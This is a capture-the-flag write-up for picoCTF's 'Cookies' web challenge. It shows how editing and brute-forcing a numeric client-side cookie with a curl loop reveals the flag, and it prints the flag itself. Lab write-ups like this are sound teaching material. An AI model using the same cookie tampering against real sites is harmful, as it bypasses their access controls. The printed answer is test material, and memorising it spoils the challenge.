# Cookies — picoCTF Writeup

## Challenge Info

| Field       | Details                                        |
|-------------|------------------------------------------------|
| Name        | Cookies                                        |
| Category    | Web Exploitation                               |
| Platform    | picoCTF                                        |
| URL         | `http://wily-courier.picoctf.net:50202/`       |

**Description:**
Who doesn't love cookies? Try to figure out the best one.

---

## Solution

### Step 1: Explore the Website

The website is a "Cookie Search Page" where you can type a cookie name (e.g. "snickerdoodle") and it tells you how much it likes that cookie. Looking at the HTTP response, we notice:

```bash
curl -s -v http://wily-courier.picoctf.net:50202/ 2>&1
```

```
Set-Cookie: name=-1; Path=/
Location: /
```

The server sets a cookie called `name` with value `-1` and redirects. When you search for a cookie name via the form, the server maps it to a number and sets the `name` cookie to that number, then redirects to `/check`.

---

### Step 2: Understand the Mechanism

When we visit `/check` with `name=0`, the page says:

> "I love snickerdoodle cookies!"
> "That is a cookie! Not very special though..."

Each number maps to a different cookie type:

| Value | Cookie Type     |
|-------|-----------------|
| 0     | snickerdoodle   |
| 1     | chocolate chip  |
| 2     | oatmeal raisin  |
| 3     | gingersnap      |
| ...   | ...             |

The hint "Not very special though..." suggests we need to find the one that IS special.

---

### Step 3: Brute Force the Cookie Value

We iterate through different `name` values to find the special one:

```bash
for i in $(seq 0 30); do
  result=$(curl -s -b "name=$i" http://wily-courier.picoctf.net:50202/check)
  flag=$(echo "$result" | grep -o 'picoCTF{[^}]*}')
  if [ -n "$flag" ]; then
    echo "name=$i: $flag"
    break
  fi
done
```

Values 0 through 17 all return "Not very special though...". But at `name=18`:

```
name=18: picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
```

---

## Flag

```
picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
```

---

## Key Takeaways

1. **Cookies can be manipulated.** HTTP cookies are stored on the client side and can be freely modified. In this challenge, the server uses the `name` cookie value to determine which page to show. By manually changing the cookie value, we can access different responses.

2. **Brute forcing is a valid approach.** When the input space is small (integers 0 to N), iterating through all values is quick and effective. A simple bash loop with `curl` can test dozens of values in seconds.

3. **Pay attention to hints.** The message "Not very special though..." on every page tells us there IS a special one out there. Hints in CTF challenges are rarely accidental.

4. **How to modify cookies:**
   - **Browser:** DevTools → Application → Cookies → edit the value directly
   - **curl:** Use the `-b "name=value"` flag to send a custom cookie
   - **Burp Suite:** Intercept the request and modify the Cookie header
